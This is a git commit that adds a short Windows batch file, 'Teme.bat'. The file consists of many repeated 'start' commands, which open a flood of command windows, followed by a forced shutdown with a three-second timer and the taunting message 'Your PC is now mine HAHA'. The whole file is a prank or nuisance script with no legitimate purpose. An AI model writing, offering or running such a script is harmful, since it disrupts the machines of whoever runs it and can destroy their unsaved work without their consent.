52e052dfdbe63430729340abc819b911d4c65ee4
GosamerHawk <86345192+GosamerHawk@users.noreply.github.com>
2021-06-23 10:36:36 +0300

    Add files via upload

---
+++ Teme.bat
@@ -0,0 +1,33 @@
+@echo off
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+
+
+shutdown -s -t 03 -c "Your PC is now mine HAHA"
+
+
